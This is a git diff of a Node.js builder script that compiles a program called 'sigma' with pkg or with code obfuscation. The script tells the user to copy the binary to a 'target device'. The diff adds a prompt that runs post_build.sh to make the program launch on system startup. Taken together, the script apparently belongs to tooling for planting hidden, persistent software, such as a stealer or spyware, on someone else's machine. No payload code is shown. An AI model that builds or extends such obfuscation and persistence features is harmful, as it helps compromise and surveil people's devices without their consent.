@@ -9,6 +9,9 @@ const {
 } = require('pkg');
 var shell = require('shelljs');
 
+
+
+
 var questions = [{
         type: 'input',
         name: 'user_id',
@@ -179,6 +182,13 @@ questions2 = [{
     choices: ['Compile source code using Zeit Pkg (recommended)', 'Code Obfuscation']
 }]
 
+questions3 = [{
+    type: 'list',
+    name: 'pins',
+    message: "Do you want to launch the program on system startup",
+    choices: ['Yes', 'No']
+}]
+
 
 inquirer.prompt(questions2).then(async (answers2) => {
     inquirer.prompt(questions).then(async (answers) => {
@@ -272,6 +282,12 @@ inquirer.prompt(questions2).then(async (answers2) => {
                 console.log('\nCopy created executable file - [sigma] to target device along with puppeteer folder.');
                 console.log('This binary will run on ' + require('os').platform + ' ' + process.arch + ' platform.\n');
             }
+            inquirer.prompt(questions3).then(async (answers3) => {
+                console.log('')
+                if (answers3.pins == 'Yes') {
+                    shell.exec("./post_build.sh").stdout
+                }
+            })
         }
     });
 });
